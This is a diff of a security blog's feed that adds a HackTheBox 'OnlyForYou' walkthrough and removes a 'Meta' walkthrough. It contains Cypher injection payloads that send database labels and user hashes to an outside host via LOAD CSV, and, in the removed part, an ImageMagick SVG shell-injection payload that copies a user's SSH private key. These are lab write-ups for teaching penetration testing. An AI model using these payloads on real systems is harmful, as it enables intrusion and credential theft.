@@ -1,4 +1,290 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-08-12T18:31:43+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A blog for infosec stuff.</subtitle><entry><title type="html">Busqueda - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/busqueda.html" rel="alternate" type="text/html" title="Busqueda - HackTheBox" /><published>2023-08-12T00:00:00+01:00</published><updated>2023-08-12T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/busqueda</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/busqueda.html"><![CDATA[<p><strong>Busqueda</strong> is a nice easy linux machine on <em>HackTheBox</em>. It starts with a web application that’s vulnerable to <em>RCE</em>. Once on the box, you will find a GIT repo that has a cred in it’s remote origin config, which will give you access to a <em>Gitea</em> instance. Privesc is by exploiting a custom script with sudo perms.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-08-26T12:20:26+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A blog for infosec stuff.</subtitle><entry><title type="html">OnlyForYou - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/only4you.html" rel="alternate" type="text/html" title="OnlyForYou - HackTheBox" /><published>2023-08-26T00:00:00+01:00</published><updated>2023-08-26T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/only4you</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/only4you.html"><![CDATA[<p><strong>OnlyForYou</strong> is a medium linux box on <em>HackTheBox</em>. It starts with exploiting an LFI vulnerability to leak application source code, which reveals a code injection vulnerability. Once inside the box, you setup a tunnel to a local web app that’s vulnerable to <em>Cypher Injection</em>. Privesc is through a sudo permission on <code class="language-plaintext highlighter-rouge">pip3 download</code>.</p>
+
+<h3 id="info">Info</h3>
+<p><br /></p>
+
+<p><img src="/assets/img/Pasted image 20230819232132.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230819232206.png" alt="" /></p>
+
+<p><br /></p>
+
+<h3 id="recon">Recon</h3>
+<p><br /></p>
+
+<h4 id="nmap">NMAP</h4>
+<p><br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="rouge-code"><pre># Nmap 7.80 scan initiated Sat Aug 19 12:04:50 2023 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.210
+Nmap scan report for 10.10.11.210
+Host is up (0.39s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: POST OPTIONS
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://only4you.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Aug 19 12:06:02 2023 -- 1 IP address (1 host up) scanned in 72.40 seconds
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="web">Web</h4>
+<p><br /></p>
+
+<p>NMAP showed port 80 is redirecting to <code class="language-plaintext highlighter-rouge">http://only4you.htb</code>, so I added it to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file;</p>
+
+<p><img src="/assets/img/Pasted image 20230819232903.png" alt="" /></p>
+
+<p>Most of the links in the page are dead, but there is a contact-us form at the bottom;</p>
+
+<p><img src="/assets/img/Pasted image 20230819233021.png" alt="" /></p>
+
+<p>Filling the form and clicking the send button generated a POST request;</p>
+
+<p><img src="/assets/img/Pasted image 20230819233313.png" alt="" /></p>
+
+<p>Tampering with the parameters a little showed an error, which confirms the server is processing the request;</p>
+
+<p><img src="/assets/img/Pasted image 20230819233445.png" alt="" /></p>
+
+<p>The FAQ section linked to another subdomain, <code class="language-plaintext highlighter-rouge">beta.only4you.htb</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230819233716.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230819233827.png" alt="" /></p>
+
+<p>The <em>Source Code</em> button links to <code class="language-plaintext highlighter-rouge">http://beta.only4you.htb/source</code>, which start a download for <code class="language-plaintext highlighter-rouge">source.zip</code>. The source code of the web app is found inside (it’s a flask web app);</p>
+
+<p><img src="/assets/img/Pasted image 20230819234154.png" alt="" /></p>
+
+<p>Nothing of interest was found in the implementation of both image conversion and resizing featured by the site. Further look revealed a function named <code class="language-plaintext highlighter-rouge">download()</code> that handles POST requests to the <code class="language-plaintext highlighter-rouge">/download</code> route. This function is vulnerable to LFI through the <code class="language-plaintext highlighter-rouge">image</code> parameter;</p>
+
+<p><img src="/assets/img/Pasted image 20230819234721.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230819235052.png" alt="" /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h3 id="foothold">Foothold</h3>
+<p><br /></p>
+
+<p>We already have the source code of <code class="language-plaintext highlighter-rouge">beta.only4you.htb</code>, but not that of the main domain <code class="language-plaintext highlighter-rouge">only4you.htb</code>. Since the sites are running behind <em>Nginx</em> as indicated in the <em>server</em> response header, I read the default <em>Nginx</em> config file at <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/default</code>, which revealed the web root of <code class="language-plaintext highlighter-rouge">only4you.htb</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230819235544.png" alt="" /></p>
+
+<p>Since <code class="language-plaintext highlighter-rouge">beta.only4you.htb</code> is a flask app, I checked for <code class="language-plaintext highlighter-rouge">app.py</code> in the web root of <code class="language-plaintext highlighter-rouge">only4you.htb</code>, and it exists. The <code class="language-plaintext highlighter-rouge">app.py</code> file imported <code class="language-plaintext highlighter-rouge">sendmessage</code> from a module named <code class="language-plaintext highlighter-rouge">form</code> (<code class="language-plaintext highlighter-rouge">form.py</code>), which was also dumped;</p>
+
+<p><img src="/assets/img/Pasted image 20230820000138.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230820000422.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230820000332.png" alt="" /></p>
+
+<p>Notice how the <code class="language-plaintext highlighter-rouge">issecure()</code> function is using a loose regex to filter the email address, before passing the domain part (everything after <code class="language-plaintext highlighter-rouge">@</code>) to a <code class="language-plaintext highlighter-rouge">subprocess.run()</code>, which is used for executing shell command. This makes it vulnerable to <em>code injection</em>, which I exploited to gain a shell on the box as the user <code class="language-plaintext highlighter-rouge">www-data</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230820000947.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230820001024.png" alt="" /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h3 id="user">User</h3>
+<p><br /></p>
+
+<p>There are <strong>2</strong> user accounts on the box;</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre>www-data@only4you:/dev/shm$ cat /etc/passwd | grep 'sh$'
+root:x:0:0:root:/root:/bin/bash
+john:x:1000:1000:john:/home/john:/bin/bash
+neo4j:x:997:997::/var/lib/neo4j:/bin/bash
+dev:x:1001:1001::/home/dev:/bin/bash
+www-data@only4you:/dev/shm$ 
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Some Interesting service running locally;</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre>www-data@only4you:~/only4you.htb$ ss -ltn
+State   Recv-Q  Send-Q        Local Address:Port    Peer Address:Port  Process  
+LISTEN  0       151               127.0.0.1:3306         0.0.0.0:*              
+LISTEN  0       511                 0.0.0.0:80           0.0.0.0:*              
+LISTEN  0       4096          127.0.0.53%lo:53           0.0.0.0:*              
+LISTEN  0       128                 0.0.0.0:22           0.0.0.0:*              
+LISTEN  0       4096              127.0.0.1:3000         0.0.0.0:*              
+LISTEN  0       2048              127.0.0.1:8001         0.0.0.0:*              
+LISTEN  0       70                127.0.0.1:33060        0.0.0.0:*              
+LISTEN  0       50       [::ffff:127.0.0.1]:7474               *:*              
+LISTEN  0       128                    [::]:22              [::]:*              
+LISTEN  0       4096     [::ffff:127.0.0.1]:7687               *:*              
+www-data@only4you:~/only4you.htb$
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>So I uploaded <code class="language-plaintext highlighter-rouge">chisel</code> and setup a reverse tunnel for port <code class="language-plaintext highlighter-rouge">3000</code> and <code class="language-plaintext highlighter-rouge">8001</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230820002041.png" alt="" /></p>
+
+<p>This opens up port <code class="language-plaintext highlighter-rouge">3000</code> and <code class="language-plaintext highlighter-rouge">8001</code> on my box and proxied them to the box through the reverse connection. Loading up port <code class="language-plaintext highlighter-rouge">3000</code> showed an instance of <em>Gogs</em>;</p>
+
+<p><img src="/assets/img/Pasted image 20230820002330.png" alt="" /></p>
+
+<p>Port <code class="language-plaintext highlighter-rouge">8001</code> seems to be hosting some custom web app;</p>
+
+<p><img src="/assets/img/Pasted image 20230820002422.png" alt="" /></p>
+
+<p>Trying some common defaults, I got in using <code class="language-plaintext highlighter-rouge">admin:admin</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230820002518.png" alt="" /></p>
+
+<p>The <em>employees</em> tab has a search feature that throws a <strong>500</strong> error after adding a single quote in the search query;</p>
+
+<p><img src="/assets/img/Pasted image 20230820002709.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230820002826.png" alt="" /></p>
+
+<p>This indicates a possible SQL injection, so I passed it to <code class="language-plaintext highlighter-rouge">sqlmap</code>, which flag it as vulnerable, but was not able to detect the type of database management system (DBMS) in use;</p>
+
+<p><img src="/assets/img/Pasted image 20230820003426.png" alt="" /></p>
+
+<p>The payload looks like a MySQL query to me, but supplying it using the <code class="language-plaintext highlighter-rouge">--dbms=MySQL</code> flag didn’t work. There is a checklist in the dashboard that might explain this;</p>
+
+<p><img src="/assets/img/Pasted image 20230820004015.png" alt="" /></p>
+
+<p>The <em>neo4j’s</em> equivalent of <em>SQL injection</em> is called <em>Cypher Injection</em>. Using the cheatsheet at <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j">hacktricks</a>, I was able to dump available labels with the OOB payload;</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>' RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.73/?l='+label as l RETURN 0 as _0 //
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/Pasted image 20230824083333.png" alt="" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">user</code> label looks interesting. Dumping it with the payload;</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>a' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.73/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I got the hash of <strong>2</strong> users;</p>
+
+<p><img src="/assets/img/Pasted image 20230824083518.png" alt="" /></p>
+
+<p>This looks like a SHA256 hash. We already know the password of <code class="language-plaintext highlighter-rouge">admin</code>, so no need to crack it. Saving the hash of <code class="language-plaintext highlighter-rouge">john</code> into a file, I was able to crack it using <em>John the Ripper</em>;</p>
+
+<p><img src="/assets/img/Pasted image 20230824083815.png" alt="" /></p>
+
+<p>Local user <code class="language-plaintext highlighter-rouge">john</code> exists on the box, so I tried to login over SSH, and it worked;</p>
+
+<p><img src="/assets/img/Pasted image 20230824084039.png" alt="" /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h3 id="privesc">PrivEsc</h3>
+<p><br /></p>
+
+<p><strong>john</strong> has a <code class="language-plaintext highlighter-rouge">sudo</code> permission configured;</p>
+
+<p><img src="/assets/img/Pasted image 20230820012935.png" alt="" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">download</code> argument is used to tell <code class="language-plaintext highlighter-rouge">pip</code> to download and install a python package. This is interesting as this could allow for a straightforward RCE, but we must supply a link that starts with <code class="language-plaintext highlighter-rouge">http://127.0.0.1:3000/</code> and ends with <code class="language-plaintext highlighter-rouge">.tar.gz</code>. <em>Gogs</em> is already running on this port. Trying the creds of <code class="language-plaintext highlighter-rouge">john:ThisIs4You</code> allowed me to login;</p>
+
+<p><img src="/assets/img/Pasted image 20230820013418.png" alt="" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">Test</code> repo is private, and has nothing of interest. However, we could exploit the <code class="language-plaintext highlighter-rouge">sudo</code> perm by uploading a backdoored python package on the repo, make the repo public so it can be directly accessed externally, and then pass the direct URL to the call to <code class="language-plaintext highlighter-rouge">sudo pip3 download &lt;url&gt;</code>.</p>
+
+<p>I got a minimal python package with no dependencies (which is important as HTB boxes are not connected to the internet, which will be required to resolve unmet dependencies) at <a href="https://pypi.org/project/hello-world-20200509/">pypi</a>. I extracted the archive with;</p>
+
+<p><img src="/assets/img/Pasted image 20230820014206.png" alt="" /></p>
+
+<p>Our file of interest is <code class="language-plaintext highlighter-rouge">setup.py</code>, which is what will be executed during installation. I edited it and add a bash reverse shell;</p>
+
+<p><img src="/assets/img/Pasted image 20230820014345.png" alt="" /></p>
+
+<p>I then packaged it back as <code class="language-plaintext highlighter-rouge">backdoored.tar.gz</code> and upload it to the <code class="language-plaintext highlighter-rouge">Test</code> repo;</p>
+
+<p><img src="/assets/img/Pasted image 20230820065003.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230820062711.png" alt="" /></p>
+
+<p>I then made the repo public;</p>
+
+<p><img src="/assets/img/Pasted image 20230820062948.png" alt="" /></p>
+
+<p>I then copied the raw URL, which is <code class="language-plaintext highlighter-rouge">http://127.0.0.1:3000/john/Test/raw/master/backdoored.tar.gz</code></p>
+
+<p><img src="/assets/img/Pasted image 20230820062811.png" alt="" /></p>
+
+<p>I then passed the link to <code class="language-plaintext highlighter-rouge">sudo pip3 download http://127.0.0.1:3000/john/Test/raw/master/backdoored.tar.gz</code>, which gave me a shell on the box as <code class="language-plaintext highlighter-rouge">root</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230820063920.png" alt="" /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h3 id="summary">Summary</h3>
+<p><br /></p>
+
+<ul>
+  <li>NMAP showed port <strong>22</strong> and <strong>80</strong> listening.</li>
+  <li>Analysed the source code for <code class="language-plaintext highlighter-rouge">beta.only4you.htb</code> to find an LFI</li>
+  <li>Used it to dump the source of <code class="language-plaintext highlighter-rouge">only4you.htb</code> and identify a <em>code injection</em> vulnerability, which gave me a shell as <code class="language-plaintext highlighter-rouge">www-data</code></li>
+  <li>Inside as <code class="language-plaintext highlighter-rouge">www-data</code>;
+    <ul>
+      <li>Setup a tunnel to local services using <code class="language-plaintext highlighter-rouge">chisel</code></li>
+      <li>Found a <em>cypher injection</em> vulnerability on the service on port <code class="language-plaintext highlighter-rouge">8001</code></li>
+      <li>Exploited it to get the creds of <code class="language-plaintext highlighter-rouge">john</code> for SSH and Gogs access</li>
+    </ul>
+  </li>
+  <li>Inside as <code class="language-plaintext highlighter-rouge">john</code>;
+    <ul>
+      <li>Leveraged access to <em>Gogs</em> to exploit a <code class="language-plaintext highlighter-rouge">sudo</code> permission on <code class="language-plaintext highlighter-rouge">pip3 download</code> to download and execute a backdoored python archive as <code class="language-plaintext highlighter-rouge">root</code>.</li>
+    </ul>
+  </li>
+</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="medium" /><category term="linux" /><category term="lfi" /><category term="rce" /><category term="nginx" /><category term="flask" /><category term="chisel" /><category term="tunneling" /><category term="neo4j" /><category term="cypher injection" /><category term="pip" /><summary type="html"><![CDATA[OnlyForYou is a medium linux box on HackTheBox. It starts with exploiting an LFI vulnerability to leak application source code, which reveals a code injection vulnerability. Once inside the box, you setup a tunnel to a local web app that’s vulnerable to Cypher Injection. Privesc is through a sudo permission on pip3 download.]]></summary></entry><entry><title type="html">Busqueda - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/busqueda.html" rel="alternate" type="text/html" title="Busqueda - HackTheBox" /><published>2023-08-12T00:00:00+01:00</published><updated>2023-08-12T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/busqueda</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/busqueda.html"><![CDATA[<p><strong>Busqueda</strong> is a nice easy linux machine on <em>HackTheBox</em>. It starts with a web application that’s vulnerable to <em>RCE</em>. Once on the box, you will find a GIT repo that has a cred in it’s remote origin config, which will give you access to a <em>Gitea</em> instance. Privesc is by exploiting a custom script with sudo perms.</p>
 
 <p><br /></p>
 
@@ -4047,169 +4333,4 @@ Read data files from: /usr/bin/../share/nmap
       <li>Exploited a CVE to gain code execution as root.</li>
     </ul>
   </li>
-</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="wordpress" /><category term="custom exploitation" /><category term="rocketchat" /><category term="pwnkit" /><summary type="html"><![CDATA[Paper is a nice and easy linux box. It starts with a wordpress site that can be exploited to leak user drafts, which will lead you to an instance of RocketChat with a custom bot that’s vulnerable to path traversal. Privesc is through a CVE affecting Polkit.]]></summary></entry><entry><title type="html">Meta - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/meta.html" rel="alternate" type="text/html" title="Meta - HackTheBox" /><published>2022-06-10T00:00:00+01:00</published><updated>2022-06-10T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/meta</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/meta.html"><![CDATA[<p><strong>Meta</strong> is a pretty easy <em>medium-rated</em> box on <em>HackTheBox</em>. It starts with a website that allows for image uploads, which can be exploited to gain RCE using an <code class="language-plaintext highlighter-rouge">exiftool</code> CVE. User access is also another CVE targeting <em>ImageMagick</em>, and privesc to root is through a vulnerable sudo configuration on <code class="language-plaintext highlighter-rouge">neofetch</code>, which allows you to hijack the configuration file used by the program.</p>
-
-<p><br /></p>
-
-<h3 id="info">Info</h3>
-<p><br /></p>
-
-<p><img src="/assets/img/20220210004831.png" alt="" /></p>
-
-<p><img src="/assets/img/20220210004850.png" alt="" /></p>
-
-<hr />
-<h3 id="recon">Recon</h3>
-<p><br /></p>
-
-<h4 id="nmap">NMAP</h4>
-
-<pre><code class="language-raw"># Nmap 7.70 scan initiated Sat Jan 29 07:22:30 2022 as: nmap -sS -sV -oN nmap.txt -v meta.htb
-Nmap scan report for meta.htb (10.10.11.140)
-Host is up (0.26s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
-80/tcp open  http    Apache httpd
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Read data files from: /usr/bin/../share/nmap
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Sat Jan 29 07:24:32 2022 -- 1 IP address (1 host up) scanned in 122.32 seconds
-</code></pre>
-
-<p><br /></p>
-
-<h4 id="web">Web</h4>
-<p><br /></p>
-
-<p>Redirects to <strong>artcorp.htb</strong>.</p>
-
-<p><img src="/assets/img/20220210005037.png" alt="" /></p>
-
-<p>Bruteforcing with <code class="language-plaintext highlighter-rouge">ffuf</code> revealed a subdomain: <strong>dev01.artcorp.htb</strong>;</p>
-
-<p><img src="/assets/img/20220210005302.png" alt="" /></p>
-
-<p>The page links to <code class="language-plaintext highlighter-rouge">/metaview/</code>, which provides a form for image upload;</p>
-
-<p><img src="/assets/img/20220210005407.png" alt="" /></p>
-
-<p>After uploading an image, I got an output that resembles the one generated by <code class="language-plaintext highlighter-rouge">exiftool</code>;</p>
-
-<p><img src="/assets/img/20220210005546.png" alt="" /></p>
-
-<p>I started bruteforcing the for hidden directories in hope of finding where the files are uploaded, but was unsuccessful.</p>
-
-<p>Searching for exploits targeting <code class="language-plaintext highlighter-rouge">exiftool</code>, <strong>CVE-2021-22204</strong> caught my attention, and I found a PoC at https://github.com/convisolabs/CVE-2021-22204-exiftool</p>
-
-<p>I edited the <code class="language-plaintext highlighter-rouge">exploit.py</code> file with my host info, and then execute it to generate a malicious JPG file;</p>
-
-<p><img src="/assets/img/20220210010059.png" alt="" /></p>
-
-<p>I uploaded the file to the server, and gained code execution as <strong>www-data</strong>;</p>
-
-<p><img src="/assets/img/20220210010238.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="user">User</h3>
-<p><br /></p>
-
-<p>Listing the <code class="language-plaintext highlighter-rouge">/home</code> directory showed that a local user named <strong>thomas</strong> exist. Nothing of importance could be obtained from the source files of the web app, and I couldn’t find anything of interest in the output of <code class="language-plaintext highlighter-rouge">linpeas</code>.</p>
-
-<p>Running <code class="language-plaintext highlighter-rouge">pspy</code> on the host, I identified a cron task that runs as <strong>thomas</strong> and execute the script <code class="language-plaintext highlighter-rouge">/usr/local/bin/convert_images.sh</code>;</p>
-
-<p><img src="/assets/img/20220210010937.png" alt="" /></p>
-
-<p>The script is a simple bash script that uses <code class="language-plaintext highlighter-rouge">mogrify</code>, which is a tool of <em>ImageMagick</em> that is used to convert all files in a directory to <code class="language-plaintext highlighter-rouge">.png</code>;</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
-
-<span class="nb">cd</span> /var/www/dev01.artcorp.htb/convert_images/ <span class="o">&amp;&amp;</span> /usr/local/bin/mogrify <span class="nt">-format</span> png <span class="k">*</span>.<span class="k">*</span> 2&gt;/dev/null
-pkill mogrify
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<p>The user <code class="language-plaintext highlighter-rouge">www-data</code> that I am working as has write permissions in the directory from where images are converted;</p>
-
-<p><img src="/assets/img/20220210011257.png" alt="" /></p>
-
-<p>I identified the version of <em>ImageMagick</em> installed, and began hunting for exploits;</p>
-
-<p><img src="/assets/img/20220210011431.png" alt="" /></p>
-
-<p>After a couple of searches, I found a nice PoC at https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html that injects a shell command in the <code class="language-plaintext highlighter-rouge">authenticate</code> attribute of the <code class="language-plaintext highlighter-rouge">image</code> tag of an <code class="language-plaintext highlighter-rouge">.svg</code> file, which I edited to load the SSH private key of <strong>thomas</strong>;</p>
-
-<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-</pre></td><td class="rouge-code"><pre><span class="nt">&lt;image</span> <span class="na">authenticate=</span><span class="s">'ff" `echo $(cat /home/thomas/.ssh/id_rsa)&gt; /dev/shm/pwned`;"'</span><span class="nt">&gt;</span>
-  <span class="nt">&lt;read</span> <span class="na">filename=</span><span class="s">"pdf:/etc/passwd"</span><span class="nt">/&gt;</span>
-  <span class="nt">&lt;get</span> <span class="na">width=</span><span class="s">"base-width"</span> <span class="na">height=</span><span class="s">"base-height"</span> <span class="nt">/&gt;</span>
-  <span class="nt">&lt;resize</span> <span class="na">geometry=</span><span class="s">"400x400"</span> <span class="nt">/&gt;</span>
-  <span class="nt">&lt;write</span> <span class="na">filename=</span><span class="s">"test.png"</span> <span class="nt">/&gt;</span>
-  <span class="nt">&lt;svg</span> <span class="na">width=</span><span class="s">"700"</span> <span class="na">height=</span><span class="s">"700"</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/2000/svg"</span> <span class="na">xmlns:xlink=</span><span class="s">"http://www.w3.org/1999/xlink"</span><span class="nt">&gt;</span>
-    <span class="nt">&lt;image</span> <span class="na">xlink:href=</span><span class="s">"msl:poc.svg"</span> <span class="na">height=</span><span class="s">"100"</span> <span class="na">width=</span><span class="s">"100"</span><span class="nt">/&gt;</span>
-  <span class="nt">&lt;/svg&gt;</span>
-<span class="nt">&lt;/image&gt;</span>
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<p>I copied the file to <code class="language-plaintext highlighter-rouge">/var/www/dev01.artcorp.htb/convert_images</code>, and wait. After a few seconds, the file <code class="language-plaintext highlighter-rouge">/dev/shm/pwned</code> was created with the SSH key of <strong>thomas</strong>, which I copied to my box and used to gain access to the box as <strong>thomas</strong> over SSH;</p>
-
-<p><img src="/assets/img/20220210012154.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="privesc">PrivEsc</h3>
-<p><br /></p>
-
-<p>The user <strong>thomas</strong> has permission to run <code class="language-plaintext highlighter-rouge">/usr/bin/neofetch</code> as root using sudo without passing any arguments. This is a program used to view system info in a nice format. Notice also that the environment variable <code class="language-plaintext highlighter-rouge">XDG_CONFIG_HOME</code> is not reset by sudo, which means we can expose it’s tampered value to sudo;</p>
-
-<p><img src="/assets/img/20220211234832.png" alt="" /></p>
-
-<p>The environment variable <code class="language-plaintext highlighter-rouge">$XDG_CONFIG_HOME</code> defines the directory where user-specific configuration files are stored, normally <code class="language-plaintext highlighter-rouge">/home/&lt;username&gt;/.config</code>. Checking this directory, I found the configuration file of <code class="language-plaintext highlighter-rouge">neofetch</code> at <code class="language-plaintext highlighter-rouge">.config/neofetch/config.conf</code>, and it is basically a shell script that I can write to. So I overwrote it’s content with a bash reverse shell, set the <code class="language-plaintext highlighter-rouge">$XDG_CONFIG_HOME</code> variable, and called <code class="language-plaintext highlighter-rouge">neofetch</code> with sudo;</p>
-
-<p><img src="/assets/img/20220210013220.png" alt="" /></p>
-
-<p>This gave me a root shell on the box;</p>
-
-<p><img src="/assets/img/20220210013241.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="summary">Summary</h3>
-<p><br /></p>
-
-<ul>
-  <li>Found port <strong>80</strong> and <strong>22</strong> using <code class="language-plaintext highlighter-rouge">nmap</code></li>
-  <li>Bruteforced a subdomain <strong>dev01.artcorp.htb</strong> using <code class="language-plaintext highlighter-rouge">ffuf</code></li>
-  <li>Found an image upload page used for viewing metadata using <code class="language-plaintext highlighter-rouge">exiftool</code>
-    <ul>
-      <li>Exploited <strong>CVE-2021-22204</strong> to gain code execution.</li>
-    </ul>
-  </li>
-  <li>Inside as <strong>www-data</strong>
-    <ul>
-      <li>Identified a cron job that uses <code class="language-plaintext highlighter-rouge">mogrify</code> to convert files to <code class="language-plaintext highlighter-rouge">.png</code> in a writeable directory</li>
-      <li>Exploited a shell command injection flaw using a <code class="language-plaintext highlighter-rouge">.svg</code> file to gain code execution as <strong>thomas</strong></li>
-    </ul>
-  </li>
-  <li>Inside as <strong>thomas</strong>
-    <ul>
-      <li>Exploited a <code class="language-plaintext highlighter-rouge">sudo</code> permission on <code class="language-plaintext highlighter-rouge">neofetch</code> to gain code execution using malicious config file.</li>
-    </ul>
-  </li>
-</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="exiftool" /><category term="imagemagick" /><category term="neofetch" /><category term="sudo" /><summary type="html"><![CDATA[Meta is a pretty easy medium-rated box on HackTheBox. It starts with a website that allows for image uploads, which can be exploited to gain RCE using an exiftool CVE. User access is also another CVE targeting ImageMagick, and privesc to root is through a vulnerable sudo configuration on neofetch, which allows you to hijack the configuration file used by the program.]]></summary></entry></feed>
+</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="wordpress" /><category term="custom exploitation" /><category term="rocketchat" /><category term="pwnkit" /><summary type="html"><![CDATA[Paper is a nice and easy linux box. It starts with a wordpress site that can be exploited to leak user drafts, which will lead you to an instance of RocketChat with a custom bot that’s vulnerable to path traversal. Privesc is through a CVE affecting Polkit.]]></summary></entry></feed>
